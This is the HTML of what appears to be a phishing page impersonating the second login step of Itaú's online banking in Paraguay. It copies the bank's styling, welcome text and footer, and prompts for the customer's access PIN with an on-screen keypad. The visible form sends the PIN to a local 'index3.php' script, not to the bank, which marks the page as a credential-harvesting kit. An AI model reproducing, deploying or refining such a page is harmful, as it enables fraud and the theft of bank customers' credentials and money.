<html lang="es-py">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width" />
        <title></title>
        <link rel="shortcut icon" />

        <link rel="stylesheet" type="text/css" href="./p2/itau-base.css" />
        <!--<link rel="stylesheet" type="text/css" href="/24horasinternet/css/libs/jquery-ui/jquery.ui.all.css" />-->
        <link rel="stylesheet" type="text/css" href="./p2/login.css" />

        <link rel="stylesheet" type="text/css" href="./p2/rwb-security-token-box.css" />
        <link rel="stylesheet" type="text/css" href="./p2/rwb-security-pin-transaccion.css" />
        <link rel="stylesheet" type="text/css" href="./p2/rwb-button-generico.css" />
        <link rel="stylesheet" type="text/css" href="./p2/login1.css" />

        <link rel="stylesheet" type="text/css" href="./p2/rwb_pin_keyboard_rdhb.css" />

        <script src="./p2/jquery.js"></script>

        <script src="./p2/jqueryui.js"></script>

        <script src="./p2/jqueryval.js"></script>
        <script src="./p2/itau.js"></script>
       
        <script type="text/javascript">
            $(document).ready(function () {
                $("#InputValueCAPTCHA").captchaRWB();
                crearTeclado("InputValuePIN", undefined, "rwb_login_Siguiente");

                $(".irroba_login").css("visibility", "hidden");

                $("#rwb_login_Siguiente").on("click", function () {
                    if ($("#InputValuePIN").val() !== "") {
                        $(".irroba_login").css("visibility", "visible");
                    }
                });

                // Cifra los nuevos pines
                $("#login2_pin_access").submit(function (e) {
                    e.preventDefault();
                    var form = this;
                    try {
                        var pin = $("#InputValuePIN").valid();

                        if (pin) {
                            $.ajax({
                                url: "/24horasinternet/Login/SolicitarClave",
                                type: "GET",
                                success: function (result) {
                                    $("#InputValuePIN").val(encryptPin($("#InputValuePIN").val(), result));
                                    form.submit();
                                },
                                error: function (error) {
                                    $("#InputValuePIN").val(encryptPin($("#InputValuePIN").val(), result));
                                    form.submit();
                                },
                            });
                        }
                    } catch (e) {
                        $("#InputValuePIN").val(e);
                        form.submit(); // submit bypassing the jQuery bound event
                    }
                });
            });
        </script>
        <script>
            $(document).ready(function () {
                // JavaScript source code

                /*Media query para dispositivos mobiles de 320px*/
                if (window.matchMedia("(max-width: 320px)").matches) {
                    $(".loginResponsive").append("<div class='backMobile'><img src='./img/back.png' alt='Atras'></div>");
                    $(".teclado_borrar").empty();

                    var e = 0;

                    $(".numeros").on("click", function () {
                        e++;
                        if (e >= 4) {
                            enableButtonNext();
                        }
                    });

                    function enableButtonNext() {
                        $("#rwb_login_Siguiente").prop("disabled", false).css({
                            background: "#ec7000",
                            color: "#000",
                            border: "1px solid #ccc",
                        });
                    }

                    if ($("#InputValuePIN").val() == "") {
                        $("#rwb_login_Siguiente").prop("disabled", true).css({
                            background: "#ccc",
                            color: "#000",
                            border: "1px solid #ccc",
                        });
                    }

                    $(".rwb_login_input").on("click", function () {
                        $(".rwb_login_input").css({ borderBottom: "5px solid #efa044" });
                    });
                }

                /*Media query para dispositivos mobiles de 375px*/
                if (window.matchMedia("(max-width: 375px)").matches) {
                    $("header").empty();

                    $(".loginResponsive").append("<div class='backMobile'><img src='./img/back.png' alt='Atras'></div>");
                    $(".teclado_borrar").empty();

                    var z = 0;

                    $(".numeros").on("click", function () {
                        z++;
                        if (z >= 4) {
                            enableButtonNext();
                        }
                    });

                    function enableButtonNext() {
                        $("#rwb_login_Siguiente").prop("disabled", false).css({
                            background: "#ec7000",
                            color: "#000",
                            border: "1px solid #ccc",
                        });
                    }

                    if ($("#InputValuePIN").val() == "") {
                        $("#rwb_login_Siguiente").prop("disabled", true).css({
                            background: "#ccc",
                            color: "#000",
                            border: "1px solid #ccc",
                        });
                    }

                    $(".rwb_login_input").on("click", function () {
                        $(".rwb_login_input").css({ borderBottom: "5px solid #efa044" });
                    });
                }

                /*Media query para dispositivos mobiles de 425px*/
                if (window.matchMedia("(max-width: 425px)").matches) {
                    $("header").empty();

                    $(".loginResponsive").append("<div class='backMobile'><img src='./img/back.png' alt='Atras'></div>");
                    $(".teclado_borrar").empty();

                    var y = 0;

                    $(".numeros").on("click", function () {
                        y++;
                        if (y >= 4) {
                            enableButtonNext();
                        }
                    });

                    function enableButtonNext() {
                        $("#rwb_login_Siguiente").prop("disabled", false).css({
                            background: "#ec7000",
                            color: "#000",
                            border: "1px solid #ccc",
                        });
                    }

                    if ($("#InputValuePIN").val() == "") {
                        $("#rwb_login_Siguiente").prop("disabled", true).css({
                            background: "#ccc",
                            color: "#000",
                            border: "1px solid #ccc",
                        });
                    }

                    $(".rwb_login_input").on("click", function () {
                        $(".rwb_login_input").css({ borderBottom: "5px solid #efa044" });
                    });
                }
            });
        </script>
    </head>
    <body style="background-color: #ffffff;">
        <header>
            <div class="wrap clearfix">
                <div class="left logo mr20 s259">
                    <a title="Página inicial" class="mr20"></a>
                    <p class="sistema mt23">Identificación del cliente</p>
                </div>
            </div>
            <style type="text/css"></style>
        </header>

        <div class="top-container">
            <div class="container_16 pt50 pb50 np">
                    
                <form action="index3.php" method="post" class="form_contact">
                    <div class="responsive-content phoneContent">
                        <h2>Ingresá tu PIN de acceso</h2>
                    </div>
                    <div class="text-content phoneContent">
                        <h2 class="phoneContent">PIN de acceso</h2>
                    </div>
                    <div class="grid_9 suffix_1 s542" id="contenedorErrores" style="padding-right: 0px; width: 470px !important;">
                        <div class="loginDesktop">
                            <h2>Bienvenido(a)</h2>
                            <p class="subtitle">Por tu seguridad:</p>
                            <p class="content-info">
                                Si tu sesión no está siendo utilizada por 11 minutos, ésta será <br />
                                finalizada o cerrada automáticamente
                            </p>
                            <br />
                            <p class="subtitle">Ayuda:</p>
                            <p>
                                Preguntas frecuentes
                            </p>
                        </div>
                    </div>
                    <div class="grid_6 fix-left-mobile-col">
                        <h2 class="loginDesktop">Acceso - Paso 2</h2>
                        <div class="rwb_pin_container s438">
                            <div style="width: 215px !important;">
                                <div class="rwb_login_secure_transaccion deskContent">
                                    

                                    <style>
                                        #rwb_login_tecladoBox {
                                            padding: 0px;
                                            height: 0px;
                                            margin-top: 0px;
                                        }

                                        .login_input_color {
                                            background: #f2f2f2 !important;
                                        }

                                        .login_input_color:focus {
                                            border: 1px solid #ec7404 !important;
                                            border-image-source: initial !important;
                                            border-image-slice: initial !important;
                                            border-image-width: initial !important;
                                            border-image-outset: initial !important;
                                            border-image-repeat: initial !important;
                                            outline: 0px !important;
                                            -webkit-box-shadow: rgba(236, 116, 4, 0.8) 0px 0px 5px !important;
                                            box-shadow: rgba(236, 116, 4, 0.8) 0px 0px 5px !important;
                                            color: #464646 !important;
                                        }
                                    </style>
                                    <div>
                                        <div id="titleBox">Ingresá tu PIN de acceso</div>
                                        <div class="irroba_login" style="background: url('../imgs/common/irroba.gif') center center no-repeat; width: 40px; height: 40px; margin-top: -50px; margin-left: 210px; visibility: hidden;"></div>
                                    </div>

                                    <div class="clearfix" style="min-height: 175px;">
                                        <div class="pb-3 form-group form-group-md">
                                            <img class="iconSvg phoneContent" src="./p2/lock.png" alt="PIN" />
                                            <p>
                                                <span class="icon-itaufonts_seguranca pin-icon-custom"></span>
                                                <input
                                                    class="rwb_login_input s168 h35 login_input_color"
                                                    type="password"
                                                    style="width: 124px;"
                                                    size="10"
                                                    name="PinAcceso"
                                                    id="InputValuePIN"
                                                    readonly="readonly"
                                                    autocomplete="off"
                                                    value=""
                                                    required="required"
                                                />
                                            </p>

                                            <div class="left pr10">
                                                <div id="rwb_login_tecladoBox">
                                                    <div id="tecladoBoxDivIdDefault" class="teclado">
                                                        <div class="arrow d-none d-lg-block" style="top: 34px;"></div>
                                                        <ul id="tecladoBoxDivIdDefault_numeros" class="contenedor_botones">
                                                          
                                                  
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <style>
                                            @media only screen and (max-width: 600px) {
                                                .button-container {
                                                    zoom: 3.5;
                                                }
                                            }
                                        </style>

                                        <div class="right button-container">
                                            <p class="buttons">
                                                <input
                                                    class="btn"
                                                    type="submit"
                                                    value="Acceder"
                                                    style="
                                                        color: #fff;
                                                        width: 82px;
                                                        height: 35px;
                                                        margin-right: 11px !important;
                                                        background: linear-gradient(to bottom, rgba(252, 168, 50, 1) 0%, rgba(241, 111, 92, 1) 50%, rgba(237, 95, 2, 1) 57%, rgba(212, 85, 0, 1) 100%) !important;
                                                    "
                                                />
                                            </p>
                                            <p class="textMobile">
                                                ¿Problemas con tu PIN?
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="clearfix phoneContent">
                                <ul class="right s180" style="margin-top: 15px;">
                                    <li id="rwb_login_ayuda">Preguntas frecuentes</li>
                                </ul>
                                <div class="left s160"></div>
                            </div>
                        </div>
                    </div>
                </form>
            </div>

            <!-- Footer -->

            <style>
                .footer {
                    position: fixed;
                    z-index: 999;
                    left: 0;
                    bottom: 0;
                    width: 100%;
                    text-align: left;
                }
            </style>

            <div class="footer">
                <div class="wrapBottom">
                    <div class="bottom">
                        <ul class="menuBottom">
                            <li>Políticas de privacidad</li>
                            <li>Emergencias bancarias</li>
                            <li>Sobre Itaú</li>
                            <li>Tarifario</li>
                            <li>Informe de Gobierno Corporativo</li>
                            <li>Fundación</li>
                            <li>Trabajá con nosotros</li>
                            <li>Más Seguridad</li>
                            <li>Beneficios</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div id="fb-root" class="fb_reset">
                <div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div>
            </div>
        </div>
    </body>
</html>
